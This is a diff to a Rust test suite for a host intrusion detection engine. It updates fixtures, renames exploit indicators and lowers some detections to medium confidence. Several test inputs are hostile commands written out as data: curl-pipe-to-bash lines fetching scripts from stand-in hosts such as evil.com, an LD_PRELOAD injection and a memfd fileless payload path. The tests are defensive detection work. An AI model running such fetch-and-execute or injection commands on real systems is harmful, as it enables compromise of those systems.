@@ -15,6 +15,9 @@ fn event(ts: i64, class: EventClass, process: &str, parent: &str, uid: u32) -> T
         parent_process: parent.to_string(),
         session_id: 100,
         file_path: None,
+        // RAFIX shared: default optional image and unlink semantics in existing fixtures.
+        process_exe: None,
+        file_unlink: false,
         file_write: false,
         file_hash: None,
         dst_port: None,
@@ -81,7 +84,7 @@ fn temporal_cap_rule(name: &str) -> TemporalRule {
 
 #[test]
 // AC-DET-201 AC-DET-202
-fn cmdline_information_consistency_between_layers() {
+fn raw_cmdline_information_is_math_not_automatic_ml_evidence() {
     let cmd = "curl http://evil.com | bash";
     let data = cmd.as_bytes();
     let metrics = information::cmdline_information(data, 20).expect("metrics expected");
@@ -97,6 +100,9 @@ fn cmdline_information_consistency_between_layers() {
         parent_process: "sshd".to_string(),
         session_id: 1,
         file_path: None,
+        // RAFIX shared: default optional image and unlink semantics in existing fixtures.
+        process_exe: None,
+        file_unlink: false,
         file_write: false,
         file_hash: None,
         dst_port: None,
@@ -126,10 +132,8 @@ fn cmdline_information_consistency_between_layers() {
 
     let features =
         layer5::MlFeatures::extract(&event, &signals, 0, 0, 0, 0, 0, &Default::default());
-    assert!((features.values[14] - normalized.renyi_h2).abs() < 1e-12);
-    assert!((features.values[15] - normalized.compression_ratio).abs() < 1e-12);
-    assert!((features.values[16] - normalized.min_entropy).abs() < 1e-12);
-    assert!((features.values[17] - normalized.entropy_gap).abs() < 1e-12);
+    assert!((0.0..=1.0).contains(&normalized.renyi_h2));
+    assert_eq!(&features.values[14..18], &[0.0; 4]);
 
     let mut behavior = behavioral::BehavioralEngine::new();
     let baseline_scores: Vec<f64> = (0..100).map(|i| i as f64 / 100.0).collect();
@@ -172,6 +176,9 @@ fn dns_entropy_feature_is_stable_and_high_for_dga_like_domains() {
         parent_process: "cron".to_string(),
         session_id: 1,
         file_path: None,
+        // RAFIX shared: default optional image and unlink semantics in existing fixtures.
+        process_exe: None,
+        file_unlink: false,
         file_write: false,
         file_hash: None,
         dst_port: Some(53),
@@ -203,7 +210,7 @@ fn dns_entropy_feature_is_stable_and_high_for_dga_like_domains() {
 }
 
 #[test]
-fn behavioral_dns_entropy_alarm_triggers_for_high_entropy_domains() {
+fn behavioral_repeated_high_entropy_domain_is_not_an_alarm() {
     let mut engine = behavioral::BehavioralEngine::new();
     let mut event = TelemetryEvent {
         ts_unix: 1,
@@ -215,6 +222,9 @@ fn behavioral_dns_entropy_alarm_triggers_for_high_entropy_domains() {
         parent_process: "init".to_string(),
         session_id: 4242,
         file_path: None,
+        // RAFIX shared: default optional image and unlink semantics in existing fixtures.
+        process_exe: None,
+        file_unlink: false,
         file_write: false,
         file_hash: None,
         dst_port: Some(53),
@@ -228,26 +238,11 @@ fn behavioral_dns_entropy_alarm_triggers_for_high_entropy_domains() {
         container_privileged: false,
     };
 
-    let mut alarm = None;
-    for idx in 0..24 {
-        event.ts_unix += idx as i64;
-        for entry in engine.observe(&event) {
-            if entry.dimension == "dns_entropy" {
-                alarm = Some(entry);
-                break;
-            }
-        }
-        if alarm.is_some() {
-            break;
-        }
+    // Repeated lookups of one high-entropy service name are not a tunnel.
+    for idx in 0..100 {
+        event.ts_unix = idx;
+        assert!(engine.observe(&event).is_empty());
     }
-
-    let alarm = alarm.expect("expected dns entropy alarm");
-    let entropy = alarm.current_entropy.expect("expected entropy value");
-    assert!(
-        entropy > 0.7,
-        "dns entropy should be high for DGA-like labels"
-    );
 }
 
 #[test]
@@ -2035,11 +2030,15 @@ fn exploit_indicator_memfd_triggers_high_confidence() {
     ev.pid = 7100;
     ev.ppid = 1;
     ev.session_id = ev.pid;
-    ev.file_path = Some("memfd:payload (deleted)".to_string());
+    ev.file_path = Some("/dev/fd/3".to_string());
+    ev.process_exe = Some("/memfd:payload (deleted)".to_string());
 
     let out = engine.process_event(&ev);
     assert!(out.signals.exploit_indicator);
-    assert!(out.exploit_indicators.iter().any(|v| v == "fileless_memfd"));
+    assert!(out
+        .exploit_indicators
+        .iter()
+        .any(|v| v == "fileless_fd_exec"));
     assert_eq!(out.confidence, Confidence::High);
 }
 
@@ -2053,13 +2052,14 @@ fn exploit_indicator_procfd_triggers_high_confidence() {
     ev.ppid = 1;
     ev.session_id = ev.pid;
     ev.file_path = Some("/proc/4242/fd/3".to_string());
+    ev.process_exe = Some("/memfd:payload (deleted)".to_string());
 
     let out = engine.process_event(&ev);
     assert!(out.signals.exploit_indicator);
     assert!(out
         .exploit_indicators
         .iter()
-        .any(|v| v == "fileless_procfd"));
+        .any(|v| v == "fileless_fd_exec"));
     assert_eq!(out.confidence, Confidence::High);
 }
 
@@ -2079,12 +2079,12 @@ fn exploit_indicator_ignores_proc_self_fd_runtime_artifacts() {
     assert!(!out
         .exploit_indicators
         .iter()
-        .any(|v| v == "fileless_procfd"));
+        .any(|v| v == "fileless_fd_exec"));
 }
 
 #[test]
 // AC-DET-219
-fn exploit_indicator_tmp_interpreter_triggers_high_confidence() {
+fn exploit_indicator_tmp_exec_is_context_not_high() {
     let mut engine = DetectionEngine::default_with_rules();
 
     let mut ev = event(22, EventClass::ProcessExec, "python", "init", 1000);
@@ -2092,15 +2092,14 @@ fn exploit_indicator_tmp_interpreter_triggers_high_confidence() {
     ev.ppid = 1;
     ev.session_id = ev.pid;
     ev.file_path = Some("/tmp/evil".to_string());
+    ev.process_exe = ev.file_path.clone();
+    ev.parent_process = "bash".into();
     ev.command_line = Some("python -c 'print(1)'".to_string());
 
     let out = engine.process_event(&ev);
-    assert!(out.signals.exploit_indicator);
-    assert!(out
-        .exploit_indicators
-        .iter()
-        .any(|v| v == "fileless_tmp_interpreter"));
-    assert_eq!(out.confidence, Confidence::High);
+    assert!(!out.signals.exploit_indicator);
+    assert!(out.exploit_indicators.iter().any(|v| v == "exec_from_tmp"));
+    assert_eq!(out.confidence, Confidence::Medium);
 }
 
 #[test]
@@ -2116,11 +2115,12 @@ fn exploit_indicator_ld_preload_temp_path_triggers() {
     ev.command_line = Some("LD_PRELOAD=/tmp/libinject.so /usr/bin/id".to_string());
 
     let out = engine.process_event(&ev);
-    assert!(out.signals.exploit_indicator);
+    assert!(!out.signals.exploit_indicator);
+    assert_eq!(out.confidence, Confidence::Medium);
     assert!(out
         .exploit_indicators
         .iter()
-        .any(|v| v == "fileless_ld_preload"));
+        .any(|v| v == "ld_preload_from_writable"));
 }
 
 #[test]
@@ -2136,11 +2136,12 @@ fn exploit_indicator_pipe_exec_triggers() {
     ev.command_line = Some("curl -fsSL https://evil.example/p.sh | bash".to_string());
 
     let out = engine.process_event(&ev);
-    assert!(out.signals.exploit_indicator);
+    assert!(!out.signals.exploit_indicator);
+    assert_eq!(out.confidence, Confidence::Medium);
     assert!(out
         .exploit_indicators
         .iter()
-        .any(|v| v == "fileless_pipe_exec"));
+        .any(|v| v == "fileless_pipe_exec_context"));
 }
 
 #[test]
@@ -2161,7 +2162,7 @@ fn exploit_indicator_base64_payload_triggers() {
     assert!(out
         .exploit_indicators
         .iter()
-        .any(|v| v == "encoded_payload_suspicious"));
+        .any(|v| v == "encoded_payload_exec"));
 }
 
 #[test]
